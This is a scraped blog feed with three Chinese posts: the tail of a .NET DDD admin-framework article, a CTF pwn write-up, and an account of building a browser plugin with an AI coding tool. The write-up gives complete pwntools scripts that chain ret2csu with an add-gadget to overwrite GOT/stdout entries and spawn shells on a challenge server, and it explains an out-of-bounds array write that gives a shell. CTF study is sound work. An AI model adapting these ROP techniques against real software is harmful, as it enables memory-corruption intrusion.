FastEndpoints轻量级API框架</h4>\n<p>在API设计这块，项目选择了FastEndpoints而不是传统的Controller。主要是觉得FastEndpoints的代码更简洁，性能也更好。一个端点就是一个类，职责清晰。</p>\n<p>看一个创建部门的例子：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 创建部门的API端点\n/// &lt;/summary&gt;\n[Tags(\"Depts\")]\npublic class CreateDeptEndpoint(IMediator mediator) \n    : Endpoint&lt;CreateDeptRequest, ResponseData&lt;CreateDeptResponse&gt;&gt;\n{\n    public override void Configure()\n    {\n        Post(\"/api/admin/dept\");\n        AuthSchemes(JwtBearerDefaults.AuthenticationScheme);\n        Permissions(PermissionCodes.AllApiAccess, PermissionCodes.DeptCreate);\n    }\n    \n    public override async Task HandleAsync(CreateDeptRequest req, CancellationToken ct)\n    {\n        var cmd = new CreateDeptCommand(req.Name, req.Remark, req.ParentId, req.Status);\n        var deptId = await mediator.Send(cmd, ct);\n        var response = new CreateDeptResponse(deptId, req.Name, req.Remark);\n        await Send.OkAsync(response.AsResponseData(), cancellation: ct);\n    }\n}\n</code></pre>\n<p>代码很简洁，一个类就把路由、认证、权限都配置好了。请求和响应都是强类型的，类型安全有保障。而且测试起来也很方便，不需要启动HTTP服务器，直接测端点就行了。</p>\n<h2 id=\"几个核心特性\">几个核心特性</h2>\n<h3 id=\"1-强类型id\">1. 强类型ID</h3>\n<p>这个项目里所有聚合根都用强类型ID，而不是直接用<code>long</code>或<code>int</code>。比如部门ID是<code>DeptId</code>，用户ID是<code>UserId</code>。这样做的好处是编译器能帮你检查类型错误，不会把部门ID和用户ID搞混。</p>\n<p>使用起来也很简单：</p>\n<pre><code class=\"language-csharp\">// 定义强类型ID\npublic partial record DeptId : IInt64StronglyTypedId;\n\n// 使用强类型ID\nvar deptId = new DeptId(123);\nvar parentId = request.ParentId ?? new DeptId(0);\n</code></pre>\n<p>框架会自动处理序列化和类型转换，用起来很顺手。</p>\n<h3 id=\"2-仓储模式\">2. 仓储模式</h3>\n<p>仓储这块，写操作通过仓储来处理，查询操作直接使用DbContext。仓储的实现很简单：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门仓储接口\n/// &lt;/summary&gt;\npublic interface IDeptRepository : IRepository&lt;Dept, DeptId&gt; { }\n\n/// &lt;summary&gt;\n/// 部门仓储实现\n/// &lt;/summary&gt;\npublic class DeptRepository(ApplicationDbContext context) \n    : RepositoryBase&lt;Dept, DeptId, ApplicationDbContext&gt;(context), \n      IDeptRepository { }\n</code></pre>\n<p>框架会自动管理事务和SaveChanges，命令处理器里不需要手动调用，这样代码更简洁，也不容易出错。</p>\n<h3 id=\"3-验证机制\">3. 验证机制</h3>\n<p>验证用的是FluentValidation，支持同步和异步验证。比如创建部门的时候，需要检查部门名称是否已存在，就可以用异步验证：</p>\n<pre><code class=\"language-csharp\">public class CreateDeptCommandValidator : AbstractValidator&lt;CreateDeptCommand&gt;\n{\n    public CreateDeptCommandValidator(DeptQuery deptQuery)\n    {\n        RuleFor(d =&gt; d.Name).NotEmpty().WithMessage(\"部门名称不能为空\");\n        // 异步验证：检查部门名称是否已存在\n        RuleFor(d =&gt; d.Name)\n            .MustAsync(async (n, ct) =&gt; !await deptQuery.DoesDeptExist(n, ct))\n            .WithMessage(d =&gt; $\"该部门已存在，Name={d.Name}\");\n    }\n}\n</code></pre>\n<h3 id=\"4-异常处理\">4. 异常处理</h3>\n<p>业务异常用<code>KnownException</code>来处理，框架会自动转换成合适的HTTP状态码。比如在聚合根里：</p>\n<pre><code class=\"language-csharp\">// 在聚合根中\npublic void SoftDelete()\n{\n    if (IsDeleted)\n    {\n        throw new KnownException(\"部门已经被删除\");\n    }\n    // ...\n}\n\n// 在命令处理器中\nvar dept = await deptRepository.GetAsync(request.DeptId, cancellationToken) \n    ?? throw new KnownException($\"未找到部门，DeptId = {request.DeptId}\");\n</code></pre>\n<p>这样前端收到的错误信息就很清晰，不需要再做额外的转换。</p>\n<h2 id=\"测试策略\">测试策略</h2>\n<p>测试这块，项目用的是xUnit，集成测试用了Aspire来自动管理测试环境。这样做的好处是不用手动搭建测试数据库、Redis这些基础设施，Aspire会自动启动和管理。</p>\n<p>看一个部门创建接口的测试例子：</p>\n<pre><code class=\"language-csharp\">[Collection(WebAppTestCollection.Name)]\npublic class DeptTests(WebAppFixture app) : AuthenticatedTestBase&lt;WebAppFixture&gt;(app)\n{\n    [Fact]\n    public async Task CreateDept_WithValidData_ShouldSucceed()\n    {\n        // Arrange\n        var client = await GetAuthenticatedClientAsync();\n        var deptName = $\"测试部门_{Guid.NewGuid():N}\";\n        \n        try\n        {\n            // Act\n            var request = new CreateDeptRequest(deptName, \"测试备注\", null, 1);\n            var (response, result) = await client.POSTAsync&lt;\n                CreateDeptEndpoint, \n                CreateDeptRequest, \n                ResponseData&lt;CreateDeptResponse&gt;&gt;(request);\n            \n            // Assert\n            Assert.True(response.IsSuccessStatusCode);\n            Assert.NotNull(result?.Data);\n            Assert.Equal(deptName, result.Data.Name);\n        }\n        finally\n        {\n            await CleanupTestDataAsync();\n        }\n    }\n}\n</code></pre>\n<p>这种测试方式很接近真实的场景，测试的是完整的HTTP请求流程，而且会自动清理测试数据，保证测试之间的独立性。另外还支持身份认证测试，可以模拟登录用户的各种操作。</p>\n<h2 id=\"前端架构\">前端架构</h2>\n<p>前端用的是Vben Admin这个模板，这是一个基于Vue 3的管理后台框架。技术栈也比较主流：Vue 3 Composition API、TypeScript、Vite、Ant Design Vue，状态管理用Pinia，路由用Vue Router。</p>\n<p>Vben Admin这个框架做得很完善，开箱即用的功能很多。比如权限控制，支持路由权限和按钮权限，用起来很方便。还有国际化支持，可以多语言切换。主题和布局也可以定制，基本的管理后台需求都能满足。</p>\n<p>最重要的是类型安全，前后端都用了TypeScript，接口定义好之后，类型检查能帮你发现很多问题。</p>\n<h2 id=\"开发规范\">开发规范</h2>\n<p>为了让代码质量更统一，项目里制定了一些开发规范。比如文件的组织方式：</p>\n<ul>\n<li>聚合根放在 <code>Domain/AggregatesModel/{AggregateName}Aggregate/</code></li>\n<li>领域事件放在 <code>Domain/DomainEvents/</code></li>\n<li>仓储放在 <code>Infrastructure/Repositories/</code></li>\n<li>命令放在 <code>Web/Application/Commands/{Module}Commands/</code></li>\n<li>查询放在 <code>Web/Application/Queries/</code></li>\n<li>端点放在 <code>Web/Endpoints/{Module}Endpoints/</code></li>\n</ul>\n<p>还有一些强制性的要求，比如所有聚合根都用强类型ID，而且不手动赋值ID，依赖EF的值生成器。所有命令都要有对应的验证器。领域事件要在聚合发生改变时发布。命令处理器不能调用SaveChanges，框架会自动处理。仓储必须用异步方法。业务异常用KnownException处理。</p>\n<p>另外，项目还提供了很多代码片段，可以快速生成常用代码。比如<code>ncpcmd</code>可以生成命令及其验证器和处理器，<code>ncpar</code>可以生成聚合根，<code>ncprepo</code>可以生成仓储接口和实现，<code>epp</code>可以生成FastEndpoint的完整实现。这样开发效率会高不少。</p>\n<h2 id=\"云原生支持\">云原生支持</h2>\n<p>项目集成了.NET Aspire，这个功能真的很方便。启动开发环境只需要运行AppHost项目，Aspire会自动管理所有依赖服务，不需要手动启动数据库、Redis、RabbitMQ这些。</p>\n<pre><code class=\"language-bash\"># 仅需确保Docker环境运行\ndocker version\n\n# 直接运行AppHost项目，Aspire会自动管理所有依赖服务\ncd src/Ncp.Admin.AppHost\ndotnet run\n</code></pre>\n<p>Aspire会自动启动和管理数据库容器（MySQL、PostgreSQL等）、消息队列容器（RabbitMQ等）、Redis容器，还会提供统一的Aspire Dashboard界面，可以查看所有服务的状态。服务之间的连接字符串也会自动配置，省了很多麻烦。</p>\n<h2 id=\"代码分析可视化\">代码分析可视化</h2>\n<p>框架还提供了代码流分析和可视化功能，这个对理解架构很有帮助。可以通过命令行工具生成HTML文件：</p>\n<pre><code class=\"language-bash\"># 安装全局工具\ndotnet tool install -g NetCorePal.Extensions.CodeAnalysis.Tools\n\n# 生成可视化文件\ncd src/Ncp.Admin.Web\nnetcorepal-codeanalysis generate --output architecture.html\n</code></pre>\n<p>支持生成架构流程图、命令链路图、事件流程图、类图等，可以直观地看到代码之间的关系和数据流向。</p>\n<h2 id=\"总结\">总结</h2>\n<p>这个项目算是一个DDD架构的实践案例，展示了如何在.NET 10生态中应用DDD、CQRS、事件驱动这些架构思想。整体架构清晰，职责分明，代码组织得也比较规范。</p>\n<p>技术栈上，后端用.NET 10 + EF Core + FastEndpoints + MediatR，前端用Vue 3 + TypeScript + Vite，都是目前比较主流的技术。开发体验上，有代码片段、自动化工具，还有完善的开发规范，开发效率还可以。</p>\n<p>可维护性这块，代码分层清晰，测试支持也比较完善，还有代码可视化工具，方便新人理解架构。云原生支持也很到位，Aspire让基础设施管理变得简单。</p>\n<p>如果你也在做类似的管理系统，或者想了解DDD在实际项目中的应用，可以看看这个项目的代码，应该能有一些参考价值。项目地址在<a href=\"https://github.com/zhouda1fu/Ncp.Admin\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/zhouda1fu/Ncp.Admin</a>，欢迎交流讨论。</p>\n<h2 id=\"参考资料\">参考资料</h2>\n<p>最后附上一些相关的参考资料，有兴趣的朋友可以深入了解一下：</p>\n<ul>\n<li><a href=\"https://github.com/netcorepal/netcorepal-cloud-framework\" rel=\"noopener nofollow\" target=\"_blank\">NetCorePal Cloud Framework</a> - 项目使用的基础框架</li>\n<li><a href=\"https://fastendpoints.com/\" rel=\"noopener nofollow\" target=\"_blank\">FastEndpoints</a> - 轻量级API框架</li>\n<li><a href=\"https://github.com/vbenjs/vue-vben-admin\" rel=\"noopener nofollow\" target=\"_blank\">Vben Admin</a> - 前端管理后台模板</li>\n<li><a href=\"https://learn.microsoft.com/dotnet/aspire/\" rel=\"noopener nofollow\" target=\"_blank\">.NET Aspire</a> - 云原生应用开发平台</li>\n</ul>\n<p>项目源码地址：<a href=\"https://github.com/zhouda1fu/Ncp.Admin\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/zhouda1fu/Ncp.Admin</a></p>\n<hr />\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 22:57</span>&nbsp;\n<a href=\"https://www.cnblogs.com/aishangyipiyema\">红泥巴煮雪</a>&nbsp;\n阅读(<span id=\"post_view_count\">72</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "栈的一个magic gadget的运用以及数组越界",
      "link": "https://www.cnblogs.com/firefly-star/p/19499036",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/firefly-star/p/19499036\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 20:04\">\n    <span>栈的一个magic gadget的运用以及数组越界</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        the end？？？\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<pre><code class=\"language-asm\">.text:0000000000400658                 add     [rbp-3Dh], ebx\n.text:000000000040065B                 nop\n.text:000000000040065C                 retn\n</code></pre>\n<p>这个gadget就比较常见了，就是把ebx的值加给rbp-0x3d内的一个指针解引用后的内容，后面是进行了一个nop不作操作，再后面ret就是继续执行我们栈上的内容，这个主要是要控制rbp与rbx才能实现任意地址写，主要还是利用之前讲过的csu函数去控制这两个寄存器。下面看例题</p>\n<h4 id=\"basectf2024新生赛ezstack\">BaseCTF2024新生赛ezstack</h4>\n<p>先checksec<br />\n<img alt=\"Q3`IZ7H~STBYZ7()8IEVW0J\" class=\"lazyload\" /></p>\n<p>这里只开了nx保护，我们去ida看看<br />\n<img alt=\"Y8`A78$U0FF1LZCL(DAXO4N\" class=\"lazyload\" /></p>\n<p>这里就一个光秃秃的gets栈溢出，什么输出函数都没有。那怎么办呢？这里因为没有全开relro可以打ret2dlresolve，不过这里也有magic gadget<br />\n<img alt=\"@VCEQG%I4)ZKHTJH\" class=\"lazyload\" /></p>\n<p>那这里其实有很多解法了，第一种就是ret2dlresolve（后面我会单独写个文章和延迟绑定机制一起讲），第二种是用magic gadget写got表，写出来一个system函数，直接rop链打完，第三种是因为标准输出也是一个libc库的指针，所以我们也可以写这个，只要我们把他写成一个输出函数，就可以实现泄露libc基址<br />\n<img alt=\"}~Z${Z`MRYU)UE()AU963KW\" class=\"lazyload\" /></p>\n<p>这里其实第一种和第二种都比较看题，如果开了full relro那就不能用了，第三种就比较全一点，没有这个限制。</p>\n<h5 id=\"用magic-gadget改got表解法\">用magic gadget改got表解法</h5>\n<p>这里我们先看第二种，我们先找got表有哪些函数<br />\n<img alt=\"JN17UWAK26TT_0B\" class=\"lazyload\" /></p>\n<p>这里有两个函数，随便写哪个都一样，我们写gets看看，先找出gets和system在libc的偏移<br />\n<img alt=\"DI6441H9(178_7((DD2I4R\" class=\"lazyload\" /></p>\n<p>我们只需要把0x80520+某个数让它=0x50d70，我们这里很显然注意到这里要用补码，我们直接算一下就知道答案是0xFFFFFFFFFFFD0850所以这里就很简单了，我们只需要控制rbx是0xFFFFFFFFFFFD0850，rbp是gets的got表的地址+0x3d就写完了，完整exp如下</p>\n<pre><code>from pwn import *\nimport sys\n#context.log_level='debug'\ncontext.arch='amd64'\nflag = 1\nelf=ELF('./pwn')\nlibc = ELF('./libc.so.6')\nif flag:\n    p = remote('challenge.imxbt.cn',32689)\nelse:\n    p = process('./pwn')\nsa = lambda s,n : p.sendafter(s,n)\nsla = lambda s,n : p.sendlineafter(s,n)\nsl = lambda s : p.sendline(s)\nsd = lambda s : p.send(s)\nrc = lambda n : p.recv(n)\nru = lambda s : p.recvuntil(s)\nti = lambda : p.interactive()\ndef csu(rbx,rbp,got,rdi,rsi,rdx):\n\tpay=p64(0)+p64(rbx)+p64(rbp)+p64(got)+p64(rdi)+p64(rsi)+p64(rdx)\n\treturn pay\ndef dbg():\n    gdb.attach(p)\n    pause()\nmagic=0x400658\ncsugo=0x4006D0\ncsuin=0x4006E6\nrdi=0x4006f3\ngets=elf.got['gets']\ntarget=0x601018\nret=0x4006F4\nsystem=elf.plt['gets']\nget=elf.sym['gets']\npay=0x10*b'b'+flat(rdi,elf.bss()+0x50,get)+p64(csuin)+csu(0xFFFFFFFFFFFD0850,target+0x3d,0,0,0,0)+p64(magic)+flat(ret,rdi,elf.bss()+0x50,system)\nsl(pay)\nsl(b'/bin/sh\\x00')\nti()\n</code></pre>\n<p>效果如下<br />\n<img alt=\")QTV6KVN}9H0SDY_AM9I\" class=\"lazyload\" /></p>\n<h5 id=\"用magic-gadget改bss解法\">用magic gadget改bss解法</h5>\n<p>去改bss也可以，不过有点奇怪，我远程没打通。具体流程是一样的，先从stdin，stdout，stderr里挑一个找他们在libc里的偏移，再找一个输出函数在libc里的偏移。不过因为要泄露libc所以需要两次输入，直接返回main是会报错的，好像是因为io结构体被我们改掉了所以不能直接用gets了，这里选择就是再用一次magic gadget把我们改的io结构再改回去就可以再用gets了往bss写了，写完我们再用两次leave栈迁移过去执行即可（也可以不迁移用ret2csu），然后因为system函数会抬栈，要把gets写入bss的地址写高一点，我打本地的脚本如下</p>\n<pre><code>from pwn import *\nimport sys\n#context.log_level='debug'\ncontext.arch='amd64'\nflag = 1\nelf=ELF('./pwn')\nlibc = ELF('./libc.so.6')\nif flag:\n    p = remote('challenge.imxbt.cn',30415)\nelse:\n    p = process('./pwn')\nsa = lambda s,n : p.sendafter(s,n)\nsla = lambda s,n : p.sendlineafter(s,n)\nsl = lambda s : p.sendline(s)\nsd = lambda s : p.send(s)\nrc = lambda n : p.recv(n)\nru = lambda s : p.recvuntil(s)\nti = lambda : p.interactive()\ndef csu(rbx,rbp,got,rdi,rsi,rdx):\n\tpay=p64(0)+p64(rbx)+p64(rbp)+p64(got)+p64(rdi)+p64(rsi)+p64(rdx)\n\treturn pay\ndef dbg():\n    gdb.attach(p)\n    pause()\nmagic=0x400658\ncsugo=0x4006D0\ncsuin=0x4006E6\nrdi=0x4006f3\ngets=elf.got['gets']\nget=elf.sym['gets']\ntarget=0x601040\nret=0x4006F4\nleave=0x40068C\nbss=0x6011D0+0x800\nrbp=0x400656\npay=0x10*b'b'+p64(csuin)+csu(0xFFFFFFFFFFEF9160,target+0x3d,0,0,0,0)+p64(magic)+p64(csuin)+csu(0,1,target,2,gets,0x20)+p64(csugo)+csu(0x106EA0,target+0x3d,0,0,0,0)+p64(magic)+flat(rdi,bss,get,rbp,bss,leave)+p64(leave)\nsl(pay)\nlibcbase=u64(rc(6).ljust(8,b'\\x00'))-libc.sym['gets']\nprint(hex(libcbase))\nsystem=libcbase+libc.sym['system']\nbinsh=libcbase+next(libc.search(b'/bin/sh'))\npay=flat(0,ret,rdi,binsh,system)\nsl(pay)\nti()\n</code></pre>\n<p>我的版本是glibc2.35，小版本是3.11，远程是glibc2.35小版本是3.8。理论上远程的偏移应该是0xFFFFFFFFFFEF9008，不过我输这个不知道为啥不行，好像是没改成write函数，没有泄露出来。挺奇怪的。不过思路大概就是这样，效果如下<br />\n<img alt=\"5IQ7YA{1KO8@%}O53GIFQXL\" class=\"lazyload\" /></p>\n<h2 id=\"数组越界\">数组越界</h2>\n<p>数组越界顾名思义，也就是访问数组时索引超出定义范围，可能导致程序访问非法内存。比如我定义一个数组a[10]，然后后面有a[i]但i却能等于10，这就越界了。如果他检查i范围检查的不细致（没检查上界或下界）就可以实现几乎任意地址访问，那具体访问的地址是什么地址的呢？这就得有一些c语言基础了，在c语言中我们知道a[1]=*(a+1)这样我们的a[i]其实就是 *(a+i)假如i可以控制，或者a+i这个地址就是我们想改的地址，那么我们就可以访问到这个地址的内存，就很有可能可以进行修改。具体的地址运算就要看该数组的定义，int就是4字节定义，假如int a[10]那a地址与a+1地址就差4，char就差1，double就差8，二维数组也一样，二维数组可以看成一维数组的数组，比如int a[10] [10]，相当于把a[10]又看成一个数组的元素，那a[1]距离a就差10个int，也就是40。还不懂的话可以去看看c语言，下面我们看题。</p>\n<h4 id=\"basectf2024新生赛五子棋\">BaseCTF2024新生赛五子棋</h4>\n<p>这题其实9分逆向1分pwn，逆向出来了基本就写完了，不过我们还是老规矩先checksec<br />\n<img alt=\"AHGT0C`N8%FTZZHROPA}GA\" class=\"lazyload\" /></p>\n<p>然后去ida看看<br />\n<img alt=\"1BR8%BU`Y3$LHVL45_LDO\" class=\"lazyload\" /></p>\n<p>这里既然是五子棋，那肯定要有这几个模块，打印地图，玩家下棋，另一方下棋，检查，获胜。简单逆向一下，这里逻辑就是首先展示地图，然后用户先下，判断用户是否赢，没赢就递归调用game函数把a1改成1让if为真，进而让电脑下棋，然后判断电脑有没有赢，然后把a1改成0让用户再下，只要我们的下两颗棋就获胜就给我们shell，显然这样直接下不可能获得shell，所以一定有某个漏洞。</p>\n<p><img alt=\"13OB90LPMQE$QMFA58{{B$1\" class=\"lazyload\" /></p>\n<p>这里漏洞在用户下棋那里<br />\n<img alt=\"QFWDFOKY%HT2OQ06@8CKD\" class=\"lazyload\" /></p>\n<p>这里有数组越界，不过运用的时候要注意因为地图其实里面一开始都是数字-1，所以我们只能在数字为-1的地方改数值，改成这个0，接下来我们看判断输赢的函数。</p>\n<p>这里我们可以看见，这里四个循环，而这个x数组和y数组配合起来应该就是一个方向数组，通过n7的循环让这两个数组组合实现标定方向，n5的循环在遍历8个方向的棋子，n19_3与n19_2的组合就是遍历整个地图找标点，后面n7与n5就是在这个标点上延伸8个方向，如果有一次没找到对应棋子就断开这一次n5的循环换一个方向再找（也就是五子棋没连起来五个子），如果能找到五个（遍历五次）就判断获胜。我们可以看看这个方向向量的数组<br />\n<img alt=\"OMY$C@ROM(2T1I2HJN~SDS\" class=\"lazyload\" /></p>\n<p>这个dd就是定义双字的意思define doubleword，双字就是4个字节，也就是int的意思。其中2  dup(0)就是0重复两次，0FFFFFFFFh这里h就是16进制的意思，其实就是0xFFFFFFFF，这个就是-1的补码形式，数组内容如下</p>\n<pre><code>y ：0 0 1 -1 1 -1 1 -1\nx : 1 -1 0 0 1 -1 -1 1\n</code></pre>\n<p>因为小端序所以他们的地址就是从左到右就是依次由0x4020去+4。到这里这个题就差不多结束了，因为我们用户输入能把-1变成0，这里我们要么选0x402c这个地址把这个-1变成0，这样xy组合的方向向量就变成(0,0)了，相当于这个地方延伸的五个方向都是他自己，实现检查自己五次，那就可以实现两颗棋子获胜了（也就是第二颗棋子下在方向数组里了哈哈），要么我们选把0x4044这个地址的-1变成0，这些都可以。接下来我们算我们地图数组到方向数组的偏移<br />\n<img alt=\"KF%FKN`58RO2DF_UMIL5JO1\" class=\"lazyload\" /></p>\n<p>地图数组的起始位置是0x9D60而且他也是int，以0x4044为例，到这的偏移就是0x9D60-0x4044也就是0x5D1C也就是十进制的23836我们知道int代表4字节，23836也就是5,959个偏移，也就是我们需要map[-5959]就能改到这个位置实现把方向向量改成(0,0)，我们下棋是这样下的<br />\nmap[20 * n19 + n19_1]=0，所以就随便搭配一下n19和n19_1凑出来-5959就可以了，这里注意n19，n19_1不能大于19就可以了，比如-298*20  1<br />\n或者-297 *20  -19都可以。这样我们只需要nc上去，先随便下一个地方，再输入-298 1或者-297 -19就getshell了。效果如下。<br />\n<img alt=\"IX4X{`$K@{BILRR~N4HWRU\" class=\"lazyload\" /></p>\n<p><img alt=\"09NCIA80SBA}{@1)(R7IAU\" class=\"lazyload\" /></p>\n<p><img alt=\"R6ISE2(U50D_B%M2_XEW0\" class=\"lazyload\" /></p>\n<p>这题感觉设计的挺好的，有点意思，虽然逆向了我好久...</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 20:04</span>&nbsp;\n<a href=\"https://www.cnblogs.com/firefly-star\">firefly_star</a>&nbsp;\n阅读(<span id=\"post_view_count\">38</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "告别代码！我用Trae氛围编程的方式，开发了一款公众号文章同步插件！",
      "link": "https://www.cnblogs.com/chingho/p/19498962",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/chingho/p/19498962\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 19:02\">\n    <span>告别代码！我用Trae氛围编程的方式，开发了一款公众号文章同步插件！</span>\n    \n\n</a>\n\n\t\t</h1>\n\t\t<div class=\"clear\"></div>\n\t\t<div class=\"postBody\">\n\t\t\t    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        大家好，我是编程乐趣。我利用周末时间，没有写任何一行代码，用Trae氛围编程的方式，完成一个浏览器插件的开发。最大的感受是，未来编程方式，对阅读代码、代码语法、编程语言等能力变得不再重要，懂得与AI对方才是最重要的能力。下面和大家分享下，我开发这款插件的完整过程与感受。该插件我已经在Github开源了，大家自行文末获取。一、插件产品介绍# 产品简介\n\n一个浏览器插件，用于在公众号文章页面自动显示同...\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p><span>大家好，我是编程乐趣。</span><span>我利用周末时间，<span>没有写任何一行代码，<span>用Trae氛围编程的方式，<span>完成一个浏览器插件的开发。</span></span></span></span><span><span>最大的感受是，未来编程方式，对阅读代码、代码语法、编程语言等能力变得不再重要，懂得与AI对方才是最重要的能力。</span></span><span>下面和大家分享下，我开发这款插件的完整过程与感受。</span></p>\n<p><strong>该插件我已经在Github开源了，大家自行文末获取。</strong></p>\n<p>&nbsp;</p>\n<p><strong>一、插件产品介绍</strong></p>\n<p><strong># 产品简介</strong></p>\n<p>一个浏览器插件，用于在公众号文章页面自动显示同步按钮，支持一键同步到多个平台。</p>\n<img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024657-790542621.png\" />\n<p><strong># 功能特性</strong></p>\n<p>-&nbsp;📤 在公众号文章页面自动注入同步按钮</p>\n<p>-&nbsp;🔄 支持一键同步到多个平台</p>\n<p>-&nbsp;✅ 支持平台勾选选择</p>\n<p>-&nbsp;🎨 美观易用的UI界面</p>\n<p><strong># 当前支持的平台</strong></p>\n<p>-&nbsp;📝 CSDN</p>\n<p>-&nbsp;🏫 博客园</p>\n<p>-&nbsp;🧠 知乎</p>\n<p>-&nbsp;📰 今日头条</p>\n<p><span>&nbsp;</span></p>\n<p><strong>二、开发完整步骤流程</strong></p>\n<p><span><span>由于开发过程中，没有截图，我只能通过文字来和大家分享。</span></span></p>\n<span><span>1、我告诉Trae，我要开发一款公众号文章同步浏览器插件，并罗列要支持的平台、需要完成的功能。</span></span><span><span>Trae：可以完整生成插件代码，同时会生成logo图片的配置信息。但没有生成logo图片。</span></span><img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024519-1701600050.png\" /><span><span>2、<span>我告诉Trae，帮我生成一个logo图片，用于做这个浏览器插件图标。这个产品我取名为：OneClick，<span>设计要求：<span>logo用产品名、绿色背景。</span></span></span></span></span><img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024555-1868309316.png\" /><span><span>Trae：<span><br /></span></span></span>\n<ul class=\"list-paddingleft-1\">\n<li><span>Trae会检测我电脑环境是否安装node，并使用node生成logo图片，但执行过程中发现我node版本过低，提示我要安装node相关插件。</span></li>\n<li><span>我电脑有安装多个node版本，Trae没有检测我电脑是否存在多个版本，直接提示我缺少相关插件，并给出<span>确认按钮，问我是否要安装插件，这边需要我人工点击确认。</span></span></li>\n<li><span><span>我点击确认后，Trade自动生成logo.svg文件，并根据要求生成不同尺寸的logo文件。</span></span></li>\n\n\n\n</ul>\n\n\n\n<span><br /></span><span><span>3、<span>完成以上步骤后，我把插件导入到Chrome浏览器，并尝试运行。<span>结果并不能完整运行。</span></span></span></span>\n<ul class=\"list-paddingleft-1\">\n<li><span>插件实现方式，打开不同标签页面，并自动填充标题、内容。有部分平台可以正确填充，有些不行。</span></li>\n\n\n\n</ul>\n\n\n\n<span><br /></span><span><span>4、<span>我告诉Trae，<span>不要使用打开不同标签页面的方式<span>，改为后台自动运行的方式。</span></span></span></span></span><span><span>Trae<span>：可以正确理解我要使用ApI的方式，并进行修改。</span></span></span><span><br /></span><span><span>5、完成修改后，我进行测试，依然是无法完成同步。</span></span><span><span>6、<span>接下去的几轮对话中，<span>我不断告诉Trae，同步功能有问题，插件界面有显示同步错误情况，我也把错误情况发送给Trae<span>，Trae也不断的进行代码修改，最终也是不能实现。</span></span></span></span></span><span><span>7、<span>我做了一个改变，查看浏览器的运行日志。并把更详细错误日志发送给Trae。Trae根据更详细日志，也修复几个Bug，但并不能完整实现同步功能。</span></span></span><span><span>8、<span>经过好几轮的对话，并不能实现我想要的功能，<span>我于是让Trae打印更详细的日志，方便我给她反馈<span>。Trae修改代码，并打印更详细的日志。</span></span></span></span></span><img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024519-743493286.webp\" /><span><span>9<span>、继续经过好几轮对话，还是不能正确实现功能。通过日志查看，Trae提交的API，并不是正确的。<span>这个是由于各个平台，并没有公开的API文档<span>，所以Trae是通过搜索网络文档和猜测的方式，不断修改代码。</span></span></span></span></span><span><span>10、<span>由于不能实现功能，我只能是到各个平台，手动操作保存文章草稿，并通过浏览器插件，提取相关的接口Url、请求标头、提交报文等信息。</span></span></span>\n<ul class=\"list-paddingleft-1\">\n<li><span>有些平台支持markdown、有些只能是富文本形式。</span></li>\n<li><span>提取图片上传接口、保存草稿的接口的相关报文。</span></li>\n\n\n\n</ul>\n<p>\n\n<span><br /></span><img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024613-576081230.webp\" /><span><span>11<span>、通过我给的报文，插件可以正确提交，但都提示未登录、或者没权限。我告诉Trae，分别先访问各个平台后台（我整理各个平台后台Url），并获取Cookie并由于接口提交。</span></span></span><span><span>12<span>、通过以上的方式，并结合打印的日志，我不同让Trae调整，最终完整实现功能。</span></span></span><span><br /></span></p>\n<p><strong><span>三、开发总结</span></strong></p>\n<p><span><span>1、在这过程中，我没有手动<span>编写任何一行代码<span>。</span></span></span></span></p>\n<p><span><span>2、不再需要阅读代码，<span>只要把错误日志反馈给AI，AI就能正确的修改<span>。</span></span></span></span></p>\n<p><span><span>3、过程中，一直无法实现功能，<span>记得要求AI打印更详细的日志<span>，<span>方便我们给AI反馈。</span></span></span></span></span></p>\n<p><span><span>4、虽然不用编写代码、阅读代码，但<span>对实现原理还要知道的<span>。否则，我就不懂通过查看浏览器报文的形式，给AI反馈了。</span></span></span></span></p>\n<p><span><span>最后<span>，现在对程序员的要求已经完全变了。代码语法、代码规范、编程语言等过去要求的能力，变得越来越不重要了。</span></span></span><span><span>你只需懂得各种原理、各种知识点的概念，就能实现开发了。</span></span></p>\n<p><span><br /></span><strong>四、插件下载</strong></p>\n<p><span><span>代码我已经提交到Github，大家可以自行下载，或者网盘下载。</span></span></p>\n<p><span><span>开源项目：<span><br /></span></span></span><span>https://github.com/bianchenglequ/OneClick</span></p>\n<p><span><span>网盘下载：<span><br /></span></span></span><span>https://pan.quark.cn/s/9ef2717f5203</span></p>\n</div>\n<div class=\"clear\"></div>\n\n\t\t</div>\n\t\t<div 